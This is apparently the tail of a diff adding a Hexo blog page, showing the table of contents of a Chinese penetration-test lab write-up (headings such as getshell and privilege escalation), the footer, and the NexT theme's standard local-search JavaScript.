+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IP："><span class="nav-number">1.1.</span> <span class="nav-text">IP：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口："><span class="nav-number">1.2.</span> <span class="nav-text">端口：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#服务器："><span class="nav-number">1.3.</span> <span class="nav-text">服务器：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#目录："><span class="nav-number">1.4.</span> <span class="nav-text">目录：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞发现"><span class="nav-number">2.</span> <span class="nav-text">漏洞发现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、图片"><span class="nav-number">2.1.</span> <span class="nav-text">1、图片</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、cake-php"><span class="nav-number">2.2.</span> <span class="nav-text">2、cake.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、include-php"><span class="nav-number">2.3.</span> <span class="nav-text">3、include.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、hacked-php"><span class="nav-number">2.4.</span> <span class="nav-text">4、hacked.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#梳理"><span class="nav-number">2.5.</span> <span class="nav-text">梳理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不是转机的转机"><span class="nav-number">2.6.</span> <span class="nav-text">不是转机的转机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#真正的转机"><span class="nav-number">2.7.</span> <span class="nav-text">真正的转机</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">3.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#整体思路"><span class="nav-number">5.1.</span> <span class="nav-text">整体思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#学到的新东西"><span class="nav-number">5.2.</span> <span class="nav-text">学到的新东西</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">spira1</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
